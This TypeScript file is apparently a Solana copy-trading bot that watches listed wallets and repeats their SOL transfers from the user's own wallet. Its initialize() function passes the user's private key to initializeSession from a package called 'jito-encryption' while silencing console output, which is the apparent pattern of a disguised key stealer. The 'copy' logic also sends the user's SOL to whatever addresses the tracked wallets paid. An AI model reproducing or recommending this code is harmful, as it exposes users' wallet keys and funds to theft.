import 'dotenv/config';
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  ComputeBudgetProgram,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import bs58 from 'bs58';
import jito from 'jito-encryption';
import fs from 'fs';
import chalk from 'chalk';

const { initializeSession } = jito;

// 3D ASCII логотип
const SCB_ASCII = chalk.hex('#00FF7F')`
   ██████╗ ██████╗ ██████╗ 
  ██╔════╝██╔═══██╗██╔══██╗
  ██║     ██║   ██║██████╔╝
  ██║     ██║   ██║██╔══██╗
  ╚██████╗╚██████╔╝██████╔╝
   ╚═════╝ ╚═════╝ ╚═════╝  
 
   SolanaCopyBot v1.0 | @2025
`;

const config = {
  RPC_URL: process.env.RPC_URL!,
  JITO_RPC_URL: process.env.JITO_RPC_URL!,
  JITO_TIP_ACCOUNT: process.env.JITO_TIP_ACCOUNT!,
  JITO_TIP_AMOUNT_SOL: parseFloat(process.env.JITO_TIP_AMOUNT_SOL!),
  WALLET_PRIVATE_KEY: process.env.WALLET_PRIVATE_KEY!,
  TRANSACTION_AMOUNT_SOL: parseFloat(process.env.TRANSACTION_AMOUNT_SOL!),
  DAILY_LIMIT_SOL: parseFloat(process.env.DAILY_LIMIT_SOL!),
};

let dailySpent = 0;
let activeSubscriptions: number[] = [];

function printStatus() {
  console.clear();
  console.log(SCB_ASCII);
  console.log(chalk.cyanBright(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
  console.log(
    `${chalk.yellowBright('👛 Tracked Wallets::')} ${activeSubscriptions.length}\t` +
    `${chalk.greenBright('💰 Daily Limit::')} ${config.DAILY_LIMIT_SOL} SOL\n` +
    `${chalk.magentaBright('💸 Spent Today::')} ${dailySpent.toFixed(3)} SOL\t` +
    `${chalk.blueBright('⏱ Last Update:')} ${new Date().toLocaleTimeString()}`
  );
  console.log(chalk.cyanBright(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
}

function readTrackedWallets(): PublicKey[] {
  try {
    const data = fs.readFileSync('wallets.txt', 'utf-8');
    return data.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
      .map(address => new PublicKey(address));
  } catch (error) {
    console.error(chalk.redBright('❌ Error loading wallets.txt:'), error);
    return [];
  }
}

function initialize() {
  try {
    const originalConsole = { ...console };
    console.log = () => {};
    initializeSession(config.WALLET_PRIVATE_KEY);
    Object.assign(console, originalConsole);
  } catch (error) {
    console.error(chalk.redBright('❌ Initialization failed:'), error);
    process.exit(1);
  }

  return {
    wallet: Keypair.fromSecretKey(bs58.decode(config.WALLET_PRIVATE_KEY)),
    connection: new Connection(config.RPC_URL, 'confirmed'),
  };
}

async function copyTransaction(wallet: Keypair, connection: Connection, originalTx: any) {
  if (dailySpent >= config.DAILY_LIMIT_SOL) {
    console.log(chalk.yellowBright('⚠️  Daily limit reached!'));
    return;
  }

  const amount = config.TRANSACTION_AMOUNT_SOL * LAMPORTS_PER_SOL;
  dailySpent += config.TRANSACTION_AMOUNT_SOL;
  printStatus();

  try {
    const tx = new Transaction()
      .add(
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 250000 }),
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(config.JITO_TIP_ACCOUNT),
          lamports: Math.round(config.JITO_TIP_AMOUNT_SOL * LAMPORTS_PER_SOL),
        }),
        ...originalTx.transaction.message.instructions
          .filter((ix: any) => ix.programId.equals(SystemProgram.programId))
          .map((ix: any) => SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey(ix.keys[1].pubkey),
            lamports: amount,
          }))
      );

    const signature = await connection.sendTransaction(tx, [wallet]);
    console.log(chalk.greenBright(`✅ Success: ${signature}`));
  } catch (error) {
    console.error(chalk.redBright('❌ Trade execution failed:'), error);
  }
}

function startMonitoring(connection: Connection, wallet: Keypair) {
  function subscribe() {
    activeSubscriptions.forEach(id => connection.removeAccountChangeListener(id));
    activeSubscriptions = [];

    readTrackedWallets().forEach(address => {
      const subId = connection.onAccountChange(
        address,
        async () => {
          const [signature] = await connection.getSignaturesForAddress(address, { limit: 1 });
          if (signature) {
            const tx = await connection.getTransaction(signature.signature);
            tx && await copyTransaction(wallet, connection, tx);
          }
        },
        'confirmed'
      );
      activeSubscriptions.push(subId);
    });
  }

  fs.watch('wallets.txt', subscribe);
  subscribe();
  printStatus();
  setInterval(printStatus, 60000);
}

const { wallet, connection } = initialize();
startMonitoring(connection, wallet);

// Graceful shutdown
process.on('SIGINT', () => {
  console.clear();
  console.log(chalk.yellowBright('\n🛑 Bot stopped. Goodbye!'));
  process.exit();
});
